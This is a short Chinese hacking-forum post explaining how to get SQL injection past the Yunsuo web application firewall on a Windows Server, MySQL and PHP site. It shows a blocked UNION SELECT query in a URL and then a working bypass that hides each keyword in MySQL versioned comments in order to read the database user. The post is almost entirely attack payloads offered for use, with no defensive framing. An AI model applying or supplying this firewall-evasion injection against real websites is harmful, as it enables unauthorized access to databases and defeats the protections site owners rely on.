---
title: 过云锁注入方法
url: https://forum.90sec.com/t/topic/2296
source: 90Sec - 最新话题
date: 2023-08-17
fetch_date: 2025-10-04T11:58:40.042532
---

# 过云锁注入方法

[90Sec](/)

# [过云锁注入方法](/t/topic/2296)

[账号审核](/c/account/11)

[t1st](https://forum.90sec.com/u/t1st)

2023 年8 月 16 日 02:20

1

环境：windserver2008 + mysql+php

[![微信截图_20230722021233](https://forum.90sec.com/uploads/default/optimized/2X/a/a31f32433f31a1b9ad759914d7a61617acf6a39f_2_690x436.png)

微信截图\_202307220212331151×728 194 KB](https://forum.90sec.com/uploads/default/original/2X/a/a31f32433f31a1b9ad759914d7a61617acf6a39f.png "微信截图_20230722021233")

SQL语句拦截图：
<http://www.test123.com/article.php?id=1%20union%20select%201,2,3>

[![微信截图_20230722021251](https://forum.90sec.com/uploads/default/optimized/2X/a/a8bad0184a5d33111e2a3537492c4030a2cf4870_2_690x340.png)

微信截图\_202307220212511124×555 123 KB](https://forum.90sec.com/uploads/default/original/2X/a/a8bad0184a5d33111e2a3537492c4030a2cf4870.png "微信截图_20230722021251")

SQL绕过语句图：
[http://www.test123.com/article.php?id=-1/\*!36000union\*//\*!36000distinct\*//\*!36000select\*/1,2,user()](http://www.test123.com/article.php?id=-1/*!36000union*//*!36000distinct*//*!36000select*/1,2,user())

[![微信截图_20230722021359](https://forum.90sec.com/uploads/default/optimized/2X/9/93829e2b5780cecf67ff7d6bc60d1f54fa6d7264_2_690x248.png)

微信截图\_20230722021359879×317 60.7 KB](https://forum.90sec.com/uploads/default/original/2X/9/93829e2b5780cecf67ff7d6bc60d1f54fa6d7264.png "微信截图_20230722021359")

1 个赞

* [首页](/)
* [类别](/categories)
* [准则](/guidelines)
* [服务条款](/tos)
* [隐私政策](/privacy)

由 [Discourse](https://www.discourse.org) 提供技术支持，启用 JavaScript 以获得最佳体验